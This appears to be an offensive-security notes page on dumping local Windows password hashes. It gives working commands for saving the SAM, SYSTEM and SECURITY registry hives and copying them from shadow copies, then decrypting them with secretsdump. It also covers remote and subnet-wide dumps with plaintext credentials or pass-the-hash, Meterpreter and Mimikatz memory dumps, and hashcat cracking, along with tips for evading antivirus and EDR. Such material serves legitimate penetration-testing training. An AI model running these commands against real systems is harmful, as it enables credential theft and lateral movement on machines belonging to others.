---
title: "Attacking SAM, SYSTEM, and SECURITY"
description: "Techniques for extracting local NTLM hashes from the Windows SAM database using registry saves, secretsdump, and mimikatz."
tags:
  - password-attacks
  - sam
  - ntlm
  - hashdump
  - secretsdump
  - mimikatz
---

# 📂 Attacking SAM, SYSTEM, and SECURITY

The **Security Account Manager (SAM)** database stores the NT hashes of all **local** users on a Windows machine. If you compromise a local administrator account, extracting the SAM hashes allows you to crack local passwords or perform Pass the Hash (PtH) attacks to access other machines where the same local administrator password is reused.

---

## 1️⃣ Why We Need SYSTEM and SECURITY

You cannot simply copy `C:\Windows\System32\config\SAM` while Windows is running because the file is locked by the kernel. Furthermore, the hashes inside the SAM are encrypted.

To extract and decrypt the hashes, you need three registry hives:
1. **SAM**: Contains the encrypted local user hashes.
2. **SYSTEM**: Contains the "Boot Key" (SysKey) required to decrypt the SAM hashes.
3. **SECURITY**: (Optional but recommended) Contains "LSA Secrets" — plaintext passwords for service accounts, scheduled tasks, and cached domain credentials.

---

## 2️⃣ Extracting Hives via Registry (On-Target)

The most reliable, OPSEC-safe method to obtain these files is to save copies of the registry hives using built-in Windows commands. This requires an elevated command prompt (Local Administrator).

```cmd
C:\> reg save HKLM\SAM C:\temp\sam.save
C:\> reg save HKLM\SYSTEM C:\temp\system.save
C:\> reg save HKLM\SECURITY C:\temp\security.save
```

Once saved, exfiltrate these three files (`sam.save`, `system.save`, `security.save`) back to your attacker machine.

!!! tip
    Using `reg save` is generally safer than using memory-dumping tools like Mimikatz because saving registry hives is a normal administrative action and is less likely to trigger Antivirus or EDR alerts.

---

## 3️⃣ Extracting Hives via Volume Shadow Copies

If `reg save` is blocked or monitored, you can use the Volume Shadow Copy Service (VSS) to create a snapshot of the `C:\` drive and copy the locked files directly.

```cmd
C:\> vssadmin create shadow /for=C:
# Output will list a shadow copy volume name, e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.save
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.save
```

---

## 4️⃣ Decrypting the Hashes (Offline)

Once you have exfiltrated the hives to your attacker machine, use Impacket's `secretsdump.py` to extract the hashes.

```bash
# Basic SAM dump
impacket-secretsdump -sam sam.save -system system.save LOCAL

# Dump SAM and LSA Secrets
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

**Output Format:**
```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
*Format: `Username:RID:LM_Hash:NT_Hash:::`*
*(Note: `aad3...04ee` is the blank LM hash. The actual NT hash is the fourth field).*

---

## 5️⃣ Remote SAM Extraction

If you have Local Administrator credentials for a remote machine (or a valid NT hash), you can extract the SAM remotely without dropping a shell.

### Using Impacket `secretsdump.py`
```bash
# Using plaintext credentials
impacket-secretsdump corp.local/admin:Password123@10.10.10.50

# Using Pass the Hash
impacket-secretsdump -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/admin@10.10.10.50
```

### Using NetExec
NetExec can dump the SAM database across an entire subnet automatically.
```bash
netexec smb 10.10.10.0/24 -u admin -p Password123! --sam
```

---

## 6️⃣ In-Memory SAM Extraction (Metasploit & Mimikatz)

If you have an active SYSTEM-level shell (like a Meterpreter session), you can dump the SAM directly from memory.

### Metasploit
```bash
meterpreter > getsystem
meterpreter > hashdump
```

### Mimikatz
```bash
meterpreter > load kiwi
meterpreter > lsa_dump_sam
```

!!! warning
    Running `hashdump` or loading `kiwi` injects code into memory and is highly signatured by modern Antivirus and EDR solutions. In mature environments, this will almost certainly get your session killed.

---

## 7️⃣ Cracking the Hashes

Once you have the NT hashes, you can attempt to crack them using Hashcat (Mode 1000).

1. Save the hashes to a file, extracting only the NT hash or keeping the full `user:RID:LM:NT:::` format.
2. Run Hashcat:

```bash
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Alternatively, if cracking fails, you can use the uncracked hash directly in a Pass the Hash attack.
